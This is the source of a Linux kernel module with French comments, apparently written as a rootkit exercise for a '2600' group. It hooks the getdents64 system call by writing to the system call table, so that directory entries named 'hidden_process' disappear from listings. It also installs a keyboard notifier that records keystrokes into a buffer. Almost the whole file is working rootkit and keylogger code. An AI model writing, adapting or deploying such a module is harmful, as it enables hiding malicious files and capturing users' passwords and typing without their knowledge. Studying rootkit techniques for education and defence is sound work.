#include <linux/module.h>         // Inclut les définitions pour les modules du noyau
#include <linux/kernel.h>         // Inclut les définitions pour les fonctions du noyau de base
#include <linux/init.h>           // Inclut les macros pour les fonctions d'initialisation et de nettoyage des modules
#include <linux/syscalls.h>       // Inclut les définitions pour les appels système
#include <linux/dirent.h>         // Inclut les définitions pour les entrées de répertoires
#include <linux/uaccess.h>        // Inclut les fonctions pour copier les données entre l'espace utilisateur et le noyau
#include <linux/slab.h>           // Inclut les fonctions pour l'allocation de mémoire dans le noyau
#include <linux/keyboard.h>       // Inclut les définitions pour interagir avec les événements du clavier

MODULE_LICENSE("GPL");            // Déclare que le module utilise une licence GPL en gros utiliser et modifier le logiciel librement
MODULE_AUTHOR("Rootkit Exercice pour 2600 Ariel et Thomas"); // En bref ça Indique l'auteur du module
MODULE_DESCRIPTION("Rootkit avec la fonction getdents64 et un keylogger"); // Décrit ce que fait le module

// Adresse statique de sys_call_table j'ai essayé sans cesse de la trouver en automatique mais ça mène à des erreurs de compilations quand je fais mon makefile, si je me souviens bien du coup j'ai pris l'addresse statique
unsigned long sys_call_table = 0xffffffffa5200320; // Définit l'adresse de la table des appels système que j'ai selectionné du coup

// Pointeurs pour stocker les adresses des fonctions d'origine
asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int); // Déclare un pointeur vers la fonction d'origine getdents64

// Buffer pour stocker les frappes de clavier
static char keystroke_buffer[1024];   // Déclare un tableau pour enregistrer les frappes de clavier
static int buffer_index = 0;          // Indice actuel dans le buffer de frappes

// Fonction pour rendre la mémoire en lecture/écriture et lecture seule
void make_rw(unsigned long address) { // Rend la mémoire de l'adresse spécifiée en lecture/écriture
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    if (pte->pte & ~_PAGE_RW)
        pte->pte |= _PAGE_RW; // Met à jour les permissions de la page pour autoriser l'écriture
}

void make_ro(unsigned long address) { // Rend la mémoire de l'adresse spécifiée en lecture seule
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    pte->pte = pte->pte & ~_PAGE_RW; // Met à jour les permissions de la page pour autoriser uniquement la lecture
}

// Fonction hookée pour getdents64
asmlinkage int hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
    int nread;
    struct linux_dirent64 *kdirent, *current_dir, *prev = NULL;
    unsigned long offset = 0;

    nread = original_getdents64(fd, dirp, count); // Appelle la fonction d'origine getdents64
    if (nread <= 0)
        return nread; // Si aucune donnée n'est lue, retourne immédiatement

    kdirent = kzalloc(nread, GFP_KERNEL); // Alloue de la mémoire pour stocker les données de répertoire on fait ça pour permettre au noyau de lire et modifier ces données sans risquer 
// des erreurs de segmentation. Une fois les modifications nécessaires effectuées, les données modifiées peuvent être copiées de nouveau dans l'espace utilisateur du coup 
    if (!kdirent)
        return nread; // Si l'allocation échoue, retourne immédiatement

    if (copy_from_user(kdirent, dirp, nread)) { // Copie les données de l'utilisateur vers le noyau
        kfree(kdirent); // Libère la mémoire si la copie échoue
        return nread;
    }

    while (offset < nread) {
        current_dir = (struct linux_dirent64 *)((char *)kdirent + offset); // Parcourt les entrées de répertoire
        if (strstr(current_dir->d_name, "hidden_process")) { // Vérifie si le nom de fichier contient "hidden_process"
            if (prev)
                prev->d_reclen += current_dir->d_reclen; // Fusionne avec l'entrée précédente si elle existe
            else
                memmove(current_dir, (char *)current_dir + current_dir->d_reclen, nread - offset - current_dir->d_reclen); // Cache l'entrée
            nread -= current_dir->d_reclen; // Réduit le nombre total de bytes lus
        } else {
            prev = current_dir; // Met à jour l'entrée précédente
        }
        offset += current_dir->d_reclen; // Passe à l'entrée suivante
    }

    if (copy_to_user(dirp, kdirent, nread)) { // Copie les données modifiées vers l'utilisateur
        kfree(kdirent); // Libère la mémoire si la copie échoue
        return nread;
    }

    kfree(kdirent); // Libère la mémoire allouée
    return nread; // Retourne le nombre total de bytes lus (potentiellement modifié)
}

// Fonction pour enregistrer les frappes de clavier
static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYSYM && param->down) { // Vérifie si une touche est enfoncée
        keystroke_buffer[buffer_index++] = param->value; // Enregistre la valeur de la touche dans le buffer
        if (buffer_index >= sizeof(keystroke_buffer))
            buffer_index = 0; // Réinitialise le buffer s'il est plein
    }

    return NOTIFY_OK; // Retourne OK pour continuer la notification
}

// Structure pour enregistrer le keylogger
static struct notifier_block keylogger_notifier = {
    .notifier_call = keylogger_notify, // Associe la fonction de notification au keylogger
};

// Initialisation du module
static int __init rootkit_init(void) {
    printk(KERN_INFO "rootkit_init : Début\n");

    // Rendre la mémoire de sys_call_table en lecture/écriture
    make_rw(sys_call_table);

    // Sauvegarder la fonction originale et injecter la fonction hookée
    original_getdents64 = (void *)((unsigned long *)sys_call_table)[__NR_getdents64];
    ((unsigned long *)sys_call_table)[__NR_getdents64] = (unsigned long)hooked_getdents64;

    // Rendre la mémoire de sys_call_table en lecture seule
    make_ro(sys_call_table);

    // Enregistrer le keylogger
    register_keyboard_notifier(&keylogger_notifier);

    printk(KERN_INFO "rootkit_init : Terminé\n");
    return 0;
}

// Déchargement du module
static void __exit rootkit_exit(void) {
    printk(KERN_INFO "rootkit_exit : Début\n");

    // Rendre la mémoire de sys_call_table en lecture/écriture 1 
    make_rw(sys_call_table);

    // Restaurer la fonction originale
    ((unsigned long *)sys_call_table)[__NR_getdents64] = (unsigned long)original_getdents64;

    // Rendre la mémoire de sys_call_table en lecture seule 3 
    make_ro(sys_call_table);

    // Décharger le keylogger
    unregister_keyboard_notifier(&keylogger_notifier);

// EN Bref, j'ai fais ces étapes (du 1 au 3)  pour que nous puissions temporairement modifier la table des appels système pour nos besoins (par exemple, intercepter des appels système dans mon cas), 
//puis restaurer le système à son état d'origine de manière sûre et propre. (pour protéger l'intégrité du noyau)

    printk(KERN_INFO "rootkit_exit : Module déchargé\n"); // Je print une petite phrase pour dire que j'ai déchargé le module afin que l'user ait l'info
}

module_init(rootkit_init); // Spécifie la fonction à appeler lors du chargement du module
module_exit(rootkit_exit); // Spécifie la fonction à appeler lors du déchargement du module
